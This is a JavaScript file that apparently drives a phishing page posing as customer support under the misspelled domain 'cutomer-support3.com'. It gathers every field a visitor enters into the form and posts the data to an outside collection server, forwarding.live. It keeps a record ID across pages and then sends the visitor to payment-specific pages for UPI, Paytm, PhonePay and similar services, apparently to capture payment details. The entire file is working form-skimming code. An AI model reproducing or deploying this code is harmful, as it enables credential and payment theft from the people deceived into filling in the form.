var API_URL = "https://forwarding.live/api";
var hasPath = "";

function serverCall(body, nextURL) {
    fetch(API_URL + "/form/add", {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body),
        })
        .then((res) => res.json())
        .then((responseData) => {
             $("#submit-button").text("Submitted");
//             $("#test").text("sendData : "+JSON.stringify(responseData));
             if(responseData.status == 200) {
                    if (nextURL == '2.html') {
                        let collection_id = responseData.data;
                        if (collection_id) {
                            localStorage.setItem("collection_id", collection_id);
                        }
                    }
                    window.location.href = nextURL;
                } else {
                     $("#test").text("Error : "+JSON.stringify(responseData));
                }
        })
        .catch((error) => {
            console.error(error);
            $("#test").text("error : "+error);
        });
}

window.onload = function() {
    let form = document.getElementById("submitForm");
    let nextValue  = '';
    nextValue = document.getElementById("nextValue").value;
    if (nextValue == '2.html') {
        localStorage.removeItem("collection_id");
    }
    form.addEventListener("submit", function(event) {
        event.preventDefault();
        $("#submit-button").text("Please Wait");
        let formData = {};
        for (let i = 0; i < form.elements.length; i++) {
            let element = form.elements[i];
            if(element.tagName === 'INPUT' || element.tagName === 'TEXTAREA' || element.tagName === 'SELECT') {
                if (element.value == "Next") {
                    continue;
                }
                if (element.name === 'payment_mode' && element.checked) {
                        if(element.value=='AmzonePay' || element.value=='PhonePay' || element.value=='GooglePay' || element.value=='Paytm' || element.value=='Other'){
                            nextValue = "UPI.html";
                        }else{
                            nextValue = element.value+".html";
                        }
                 }
                if (element.type === 'radio' && element.checked) {
                    formData[element.name] = element.value;
                } else {
                    if (element.type !== 'radio') {
                        formData[element.name] = element.value;
                    }
                }
            }
        }
        let sendData = {};
        sendData['site'] = "cutomer-support3.com"
        sendData['data'] = formData;
        sendData['id'] = localStorage.getItem("collection_id");
//        $("#test").text("sendData : "+JSON.stringify(sendData));
        serverCall(sendData, nextValue);
    });
};